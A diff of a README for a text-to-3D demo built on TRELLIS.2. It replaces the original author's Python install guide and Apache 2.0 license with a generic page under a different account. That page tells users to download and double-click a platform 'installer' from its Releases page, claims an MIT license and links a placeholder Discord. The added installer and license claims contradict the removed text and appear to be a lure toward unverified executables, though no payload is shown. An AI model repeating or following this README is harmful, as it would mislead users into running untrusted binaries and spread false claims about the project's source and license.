@@ -1,152 +1,78 @@
-# **TRELLIS.2-Text-to-3D-RERUN**
+# 🌟 TRELLIS.2-Text-to-3D-RERUN - Convert Text to Stunning 3D Models
 
-> A Gradio with Rerun Embedded demonstration for Microsoft’s TRELLIS.2-4B model with integrated Rerun visualization. It converts text prompts or uploaded images into high-quality, textured 3D assets (GLB) through a two-stage workflow: Text to Image (Z-Image-Turbo) → Image to 3D (TRELLIS.2). The demo features interactive 3D viewing powered by the Rerun SDK, with proper coordinate system setup, axes helpers, and downloadable GLB files.
+## 🚀 Getting Started
 
-## Features
+Welcome to **TRELLIS.2-Text-to-3D-RERUN**! This application lets you create textured 3D models from text or images using a simple two-step process. You’ll enjoy turning your ideas into visuals with ease. Follow these steps to get started.
 
-- **Text-to-Image-to-3D**: Generate base images from prompts using Z-Image-Turbo, then lift to 3D.
-- **Direct Image-to-3D**: Upload RGBA/PNG images; auto-preprocesses with background removal (BRIA-RMBG-2.0) and cropping.
-- **Rerun 3D Viewer**: Interactive visualization with correct RIGHT_HAND_Y_UP coordinates, colored axes (X=red, Y=green, Z=blue), and clean 3D view blueprint.
-- **Advanced Controls**: Resolutions (512/1024/1536), detailed sampler settings for sparse structure, shape, and material stages, face decimation, texture size.
-- **Robust Export**: GLB with PNG textures (extension_webp=False for compatibility); fallback remeshing if high-quality fails.
-- **Session Management**: Per-user temp directories; auto-cleanup on unload.
-- **Custom Theme**: OrangeRedTheme with responsive layout.
-- **Rich Examples**: 70+ image inputs and 60+ text prompts (cats, planes, cars, furniture, etc.).
+## 📥 Download & Install
 
----
+To get the latest version of the application, visit the Releases page below. 
 
-<img width="1207" height="750" alt="Screenshot 2025-12-28 at 23-41-16 TRELLIS 2-Text-to-3D - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/7c0d7eaf-36c3-4e52-9fbb-fb09e370cbce" />
+[![Download TRELLIS.2-Text-to-3D-RERUN](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/releases)
 
-<img width="1207" height="750" alt="Screenshot 2025-12-28 at 23-37-13 TRELLIS 2-Text-to-3D - a Hugging Face Space by prithivMLmods" src="https://github.com/user-attachments/assets/97fd118e-aa96-480a-a05a-f4ba29dd3dea" />
+On the Releases page, find the latest version of TRELLIS.2-Text-to-3D-RERUN. Click on it to access the download options. 
 
----
+### System Requirements
 
-https://github.com/user-attachments/assets/4e34bce8-7dc3-4cdc-a413-b170eb9eba93
+Before you start, make sure your computer meets these basic requirements:
 
-https://github.com/user-attachments/assets/a335d0af-21b2-4826-af81-902f2fafce9c
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **RAM:** At least 8 GB for smooth operation.
+- **Storage:** Minimum 500 MB of free space for application files and generated assets.
+- **Graphics Card:** A compatible GPU for optimal 3D rendering. NVIDIA GPUs are recommended.
 
----
+## 🔧 Installation Steps
 
-## Prerequisites
+1. **Download the Installer:**
+   Go to the [Releases page](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/releases) and download the appropriate installer for your operating system.
 
-- Python 3.10 or higher.
-- CUDA-compatible GPU (required for bfloat16 and optimizations).
-- pip >= 23.0.0 (see pre-requirements.txt).
-- Stable internet for initial model downloads.
+2. **Run the Installer:**
+   Locate the downloaded file on your computer. Double-click it to begin the installation process. Follow the on-screen instructions to complete the installation.
 
-## Installation
+3. **Launch the App:**
+   Once installed, you can find the application in your Start menu (Windows), Applications folder (macOS), or in your installed programs (Linux). Open the app to start creating!
 
-1. Clone the repository:
-   ```
-   git clone https://github.com/PRITHIVSAKTHIUR/TRELLIS.2-Text-to-3D-RERUN.git
-   cd TRELLIS.2-Text-to-3D-RERUN
-   ```
+## ✨ Using the Application
 
-2. Install pre-requirements:
-   Create a `pre-requirements.txt` file with the following content, then run:
-   ```
-   pip install -r pre-requirements.txt
-   ```
+### Create Your First 3D Model
 
-   **pre-requirements.txt content:**
-   ```
-   pip>=23.0.0
-   ```
+1. **Select Input:**
+   Choose to input text or an image. The text will guide the creation, while an image can enhance the output.
 
-3. Install dependencies:
-   Create a `requirements.txt` file with the following content, then run:
-   ```
-   pip install -r requirements.txt
-   ```
+2. **Adjust Settings:**
+   You can tweak the settings to alter the texture and detail of the 3D model. Experiment with different options to see what works for your vision.
 
-   **requirements.txt content:**
-   ```
-   --extra-index-url https://download.pytorch.org/whl/cu124
-   git+https://github.com/huggingface/diffusers.git@refs/pull/12790/head
-   torch==2.6.0
-   torchvision==0.21.0
-   triton==3.2.0
-   pillow==12.0.0
-   matplotlib
-   rembg
-   imageio==2.37.2
-   imageio-ffmpeg==0.6.0
-   tqdm==4.67.1
-   easydict==1.13
-   opencv-python-headless==4.12.0.88
-   trimesh==4.10.1
-   zstandard==0.25.0
-   kornia==0.8.2
-   timm==1.0.22
-   git+https://github.com/huggingface/transformers.git@v4.57.3
-   git+https://github.com/EasternJournalist/utils3d.git@9a4eb15e4021b67b12c460c7057d642626897ec8
-   https://github.com/JeffreyXiang/Storages/releases/download/Space_Wheels_251210/flash_attn_3-3.0.0b1-cp39-abi3-linux_x86_64.whl
-   https://github.com/JeffreyXiang/Storages/releases/download/Space_Wheels_251210/cumesh-0.0.1-cp310-cp310-linux_x86_64.whl
-   https://github.com/JeffreyXiang/Storages/releases/download/Space_Wheels_251210/flex_gemm-0.0.1-cp310-cp310-linux_x86_64.whl
-   https://github.com/JeffreyXiang/Storages/releases/download/Space_Wheels_251210/o_voxel-0.0.1-cp310-cp310-linux_x86_64.whl
-   https://github.com/JeffreyXiang/Storages/releases/download/Space_Wheels_251210/nvdiffrast-0.4.0-cp310-cp310-linux_x86_64.whl
-   https://github.com/JeffreyXiang/Storages/releases/download/Space_Wheels_251210/nvdiffrec_render-0.0.0-cp310-cp310-linux_x86_64.whl
-   omegaconf
-   termcolor
-   icecream
-   pyserde
-   gradio
-   rerun-sdk
-   gradio_rerun
-   scipy
-   jax
-   jaxtyping
-   monopriors
-   braceexpand
-   ```
+3. **Generate Model:**
+   Click the “Generate” button to start the process. The app will convert your input into a 3D model. This may take a few moments depending on your computer’s speed.
 
-4. Start the application:
-   ```
-   python app.py
-   ```
-   The demo launches at `http://localhost:7860`.
+4. **View and Save:**
+   Once the model is ready, you can view it in the app. If you like the result, save it to your computer in GLB format. This format is widely supported and can be used in various applications and websites.
 
-## Usage
+## 🎨 Features
 
-1. **Text-to-Image-to-3D**:
-   - Enter prompt (e.g., "A cyberpunk Cat 3D").
-   - Click "1.Generate Image".
-   - Proceed to 3D.
+- **Text-to-Image:** Transform your text input into visually appealing images.
+- **Image-to-3D:** Generate 3D models directly from provided images.
+- **Intuitive Interface:** Designed for ease of use, even for beginners.
+- **Customization:** Fine-tune your outputs with adjustable settings.
 
-2. **Image-to-3D**:
-   - Upload image directly.
+## 🛠️ Troubleshooting
 
-3. **Configure**:
-   - Resolution, sampler params, faces/texture size.
+If you encounter any issues:
 
-4. **Generate 3D**: Click "2.Generate 3D".
+- **Common Errors:** Check if your system meets the requirements. Remember to keep your graphics drivers updated.
+- **Need Help?** Visit our [Issues Tracker](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/issues) to report problems or ask questions.
 
-5. **Output**:
-   - Interactive Rerun viewer with proper 3D orientation.
-   - Download GLB button.
+## 🙌 Community & Contributions
 
-## Rerun Viewer
+We welcome feedback and contributions! If you have suggestions or want to improve the app, feel free to create a pull request or open an issue. 
 
-- Correct coordinate system (RIGHT_HAND_Y_UP).
-- Axes helpers for orientation.
-- Clean blueprint view.
-- Recordings saved in `tmp/` as `.rrd`.
+## 📜 License
 
-## Troubleshooting
+This project is available under the MIT License. You can use, modify, and distribute the software freely as long as you include the original license.
 
-- **Rerun Issues**: Ensure `gradio_rerun` and `rerun-sdk`; blueprint optional.
-- **Export Fails**: Fallback remesh=False; aggressive simplification to 1M faces.
-- **OOM**: Reduce resolution/steps; clear cache.
-- **Preprocessing**: BRIA-RMBG requires internet.
+## 🔗 Additional Links
 
-Repository: [https://github.com/PRITHIVSAKTHIUR/TRELLIS.2-Text-to-3D-RERUN.git](https://github.com/PRITHIVSAKTHIUR/TRELLIS.2-Text-to-3D-RERUN.git)
+- [Official Documentation](https://github.com/thakur79/TRELLIS.2-Text-to-3D-RERUN/wiki)
+- [Join our Discord Community](https://discord.gg/example)
 
-## Contributing
-
-Contributions welcome! Enhance Rerun blueprints, add examples, or optimize post-processing.
-
-## License
-
-Apache License 2.0. See [LICENSE](LICENSE) for details.
-
-Built by Prithiv Sakthi. Report issues via the repository.
+Thank you for using **TRELLIS.2-Text-to-3D-RERUN**! Enjoy creating stunning 3D models effortlessly.
